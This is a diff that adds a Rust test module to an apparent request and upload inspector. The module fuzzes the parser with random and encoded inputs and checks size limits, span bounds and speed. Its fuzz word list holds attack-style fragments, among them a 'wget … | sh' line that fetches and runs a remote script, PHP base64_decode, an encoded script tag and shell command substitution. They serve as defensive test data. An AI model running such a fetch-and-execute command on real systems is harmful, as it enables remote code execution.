@@ -175,3 +175,164 @@ impl Default for Budget {
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use rand::rngs::StdRng;
+    use rand::{RngExt, SeedableRng};
+    use std::time::{Duration, Instant};
+
+    /// Every limit holds and every span lies inside its layer.
+    fn check(x: &Xray) {
+        assert!(x.layers.len() <= MAX_LAYERS);
+        assert!(x.pieces.len() <= MAX_PIECES);
+        let decoded: usize = x.layers.iter().skip(1).map(|l| l.text.len()).sum();
+        assert!(decoded <= MAX_OUTPUT + MAX_LAYERS * 64, "{decoded}");
+        for (i, l) in x.layers.iter().enumerate() {
+            assert!(x.depth(i) <= MAX_DEPTH);
+            if let Some(p) = l.parent {
+                assert!(p < x.layers.len());
+            }
+            if let Some(s) = l.from {
+                inside(x, s);
+            }
+        }
+        for p in &x.pieces {
+            inside(x, p.at);
+            assert!(p.value.len() <= MAX_VALUE);
+        }
+        for o in &x.opaque {
+            inside(x, o.at);
+        }
+    }
+
+    fn inside(x: &Xray, s: Span) {
+        let layer = &x.layers[s.layer];
+        assert!(s.start <= s.end && s.end <= layer.text.len(), "{s:?}");
+    }
+
+    /// One random input from a mix of alphabets.
+    fn input(rng: &mut StdRng) -> Vec<u8> {
+        const WORDS: [&[u8]; 14] = [
+            b"<?php ",
+            b"base64_decode('",
+            b"wget http://192.0.2.1/x.sh -O- | sh",
+            b"%3Cscript%3E",
+            b"\\x41\\x42",
+            b"Content-Disposition: form-data; name=\"a\"; filename=\"b\"\r\n\r\n",
+            b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
+            b"$(",
+            b"; ",
+            b"\xef\xbb",
+            b"\xe2\x82",
+            b"\x00",
+            b"\xff\xfe",
+            b"H4sIAAAAAAAA",
+        ];
+        // Mostly short inputs, now and then one of the full 64 KiB.
+        let len = if rng.random_range(0..2000u16) == 0 {
+            rng.random_range(0..=64 * 1024usize)
+        } else {
+            rng.random_range(0..=512usize)
+        };
+        let mode = rng.random_range(0..5u8);
+        let mut out = Vec::with_capacity(len);
+        while out.len() < len {
+            match mode {
+                0 => out.push(rng.random_range(0x20..0x7fu8)),
+                1 => out.push(rng.random_range(0..=255u8)),
+                2 => out.extend_from_slice(WORDS[rng.random_range(0..WORDS.len())]),
+                3 => {
+                    let w = WORDS[rng.random_range(0..WORDS.len())];
+                    out.extend_from_slice(w);
+                    out.extend(
+                        data_encoding::BASE64
+                            .encode(&w.repeat(rng.random_range(1..8)))
+                            .bytes(),
+                    );
+                }
+                _ => out.push(
+                    *b"%=&+\\xAZaz09_-/\n\0\xc3\xe2"
+                        .get(rng.random_range(0..20))
+                        .unwrap_or(&b'a'),
+                ),
+            }
+        }
+        out.truncate(len);
+        out
+    }
+
+    #[test]
+    fn arbitrary_bytes_never_panic() {
+        let start = Instant::now();
+        let mut rng = StdRng::seed_from_u64(0x5eed_0001);
+        for _ in 0..20_000 {
+            let bytes = input(&mut rng);
+            let x = parse(
+                Source::Request {
+                    method: "POST",
+                    path: "/x",
+                    query: Some("a=b"),
+                    body: Some(&bytes),
+                    sender: None,
+                },
+                Policy::embedded(),
+            );
+            check(&x);
+            for l in 0..x.layers.len() {
+                for (a, b) in mask_ranges(&x, l) {
+                    assert!(a <= b && b <= x.layers[l].text.len());
+                }
+            }
+            let u = parse(
+                Source::Upload {
+                    name: Some("a.php"),
+                    text: &bytes,
+                    sender: None,
+                },
+                Policy::embedded(),
+            );
+            check(&u);
+        }
+        assert!(
+            start.elapsed() < Duration::from_secs(30),
+            "{:?}",
+            start.elapsed()
+        );
+    }
+
+    #[test]
+    fn pathological_input_is_fast() {
+        let nested = {
+            let mut s = b"echo hello world, this is padded text to be opened ".repeat(4);
+            for _ in 0..12 {
+                s = data_encoding::BASE64.encode(&s).into_bytes();
+                if s.len() > 40_000 {
+                    break;
+                }
+            }
+            s.resize(64 * 1024, b'A');
+            s
+        };
+        for body in [b"$(".repeat(32 * 1024), b";".repeat(64 * 1024), nested] {
+            let start = Instant::now();
+            let x = parse(
+                Source::Request {
+                    method: "POST",
+                    path: "/x",
+                    query: None,
+                    body: Some(&body),
+                    sender: None,
+                },
+                Policy::embedded(),
+            );
+            check(&x);
+            assert!(
+                start.elapsed() < Duration::from_secs(1),
+                "{:?}",
+                start.elapsed()
+            );
+        }
+    }
+}
